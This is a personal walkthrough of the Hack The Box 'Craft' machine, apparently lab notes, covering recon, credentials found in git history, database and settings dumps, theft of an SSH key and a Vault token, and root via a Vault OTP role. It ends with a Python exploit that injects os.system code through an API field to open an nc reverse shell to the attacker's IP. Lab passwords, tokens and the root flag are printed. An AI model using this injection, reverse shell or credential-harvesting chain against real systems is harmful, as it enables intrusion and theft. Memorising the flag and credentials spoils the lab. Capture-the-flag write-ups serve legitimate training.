Begin with nmap -sV -A 10.10.10.144
==============================================
Open ports: 443 (HTTPS), 22 (SSH)
==============================================

Webpage on 443 talks about REST API. This is probably the path to initial foothold.

Firefox could not reach API page, so added 10.10.10.110 api.craft.htb to the /etc/hosts file

Retrying page and adding security exception allows the API page to be reached. 

Transmits JSON data 

Second link is a link to the documentation for the craft api. 

Downloaded API zip file

Looking at the doc's issue tracker, I think I found an API key 
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'

Proper format for this:

curl -X POST -k "https://api.craft.htb/api/brew/" -H "X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTY0Nzk5Nzk4fQ.r0i2g3xIGUwcdRR_xV6kMGbWK_An-hBWsNruOGBkdVs" -H "accept: application/json" -H  "Content-Type: application/json" -d "{  \"id\": 115,  \"brewer\": \"hackthisbox\",  \"name\": \"Iwanttobeapentester\",  \"style\": \"tryharder\",  \"abv\": \"hack\"}"

Which outputs invalid token, or token missing.

I think I need to download the git repo, find a way to make my own token, then I will be able to post to the brew api. 

How I think this should go:

	1) Find creds to log into /api/auth/login
	2) Create API token
	3) Use API token to make a post to the API
	4) I have no clue what to do after this 


Found creds for dinesh by looking through dinesh's history. Turns out he left his creds in an old commit. 

dinesh:4aUh0A8PbVJxgd 

Using these on /api/auth/login grants me an API token. 

Turns out that I dont need to create a token. I can put the credentials into test.py under tests folder and post from there. 

Wrote exploit 

gained shell by using exploit, give it /bin/sh -i to get tty

Now, settings.py can be read and we get some creds. 

Content:
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False

By using dbtest in the shell, i can change it to query users, however, I only get dinesh and the password I had before. I can log in as him on the repo.

So it turns out that fetchone() in cursor in dbtest has to be changed to fetch all, otherwise it will only return 1 result. 

ebachman:llJ77D8QFkLPQB
gilfoyle:ZEU3N8WNM2rh4T

Cannot ssh as any of these guys, but can acces the git repo as gilfoyle look at a private repo of his.

Got his rsa key.

Although it asks for a pass, the passphrase is just gilfoyles password. 

He has a small file named .vault-token in his home

vault token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

Authenticated using 
vault login token=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

Able to list secrets by using vault secrets list

Can view content of secrets with vault list secrets/

can read secrets with vault read secrets/my-key 

Got root by 

1) vault write ssh/roles/root_otp key_type=otp default_user=root cidr_list = 0.0.0.0/0

2) vault write ssh/creds/root_otp ip=10.10.10.110

3) ssh root@10.10.10.110

4) Copy the key that was printed into the password field when prompted

root.txt = 831d64ef54d92c1af795daae28a11591


Tools used
==========================
Operating system: Kali Linux – A Linux distribution designed for penetration testing
OpenVPN – An open-source program used for creating a VPN connection to hackthebox.eu servers, which allows for connection to the target. 
Nmap – A network scanner used to scan networks and systems. Discovers hosts, services, OS detection, etc. 


Summary of Results
==========================



Vulns
==========================

    


#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

brew_dict = {}
brew_dict['abv'] = "__import__('os').system('nc 10.10.12.84 34567 -e /bin/sh')"
brew_dict['brewer'] = 'All dogs'
brew_dict['name'] = 'are'
brew_dict['style'] = 'good dogs'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)

